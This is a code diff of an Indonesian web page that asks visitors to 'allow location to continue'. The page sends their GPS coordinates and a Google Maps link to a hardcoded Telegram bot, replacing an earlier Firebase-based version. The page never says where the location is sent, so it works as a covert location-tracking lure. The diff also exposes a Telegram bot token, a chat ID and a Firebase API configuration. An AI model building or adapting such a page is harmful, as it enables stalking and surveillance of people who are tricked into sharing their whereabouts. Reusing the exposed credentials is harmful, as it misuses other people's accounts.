@@ -2,52 +2,40 @@
 <html>
 <head>
   <title>Izinkan Lokasi</title>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 </head>
 <body>
-  <h2>Harap izinkan akses lokasi Anda untuk melanjutkan.</h2>
-  <button onclick="mintaLokasi()">Izinkan Lokasi</button>
+  <h2>Izinkan Lokasi Anda</h2>
+  <p>Tekan tombol di bawah untuk melanjutkan.</p>
+  <button onclick="kirimLokasi()">Izinkan Lokasi</button>
 
   <script>
-    // Firebase config
-    const firebaseConfig = {
-      apiKey: "AIzaSyBeh7zmo47_qvlo35vJjil7Fn31XipkIV0",
-      authDomain: "momon-db593.firebaseapp.com",
-      databaseURL: "https://momon-db593-default-rtdb.asia-southeast1.firebasedatabase.app",
-      projectId: "momon-db593",
-      storageBucket: "momon-db593.appspot.com",
-      messagingSenderId: "512788788909",
-      appId: "1:512788788909:web:920143794faa0aaf413824",
-      measurementId: "G-PD0VHY7GRC"
-    };
+    const BOT_TOKEN = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k';
+    const CHAT_ID = '7218964278';
 
-    // Inisialisasi Firebase
-    firebase.initializeApp(firebaseConfig);
+    function kirimLokasi() {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const link = `https://maps.google.com/?q=${lat},${lon}`;
+        const pesan = `Lokasi baru:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: ${link}`;
 
-    function mintaLokasi() {
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition((position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
-          const time = new Date().toISOString();
-
-          // Kirim ke Firebase
-          firebase.database().ref("lokasi").push({
-            latitude: lat,
-            longitude: lon,
-            mapsLink: mapsLink,
-            time: time
-          });
-
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: pesan
+          })
+        }).then(() => {
           alert("Lokasi berhasil dikirim!");
-        }, (err) => {
-          alert("Gagal mengambil lokasi: " + err.message);
+        }).catch(() => {
+          alert("Gagal mengirim lokasi.");
         });
-      } else {
-        alert("Browser tidak mendukung geolocation.");
-      }
+      }, () => {
+        alert("Gagal mendapatkan lokasi.");
+      });
     }
   </script>
 </body>
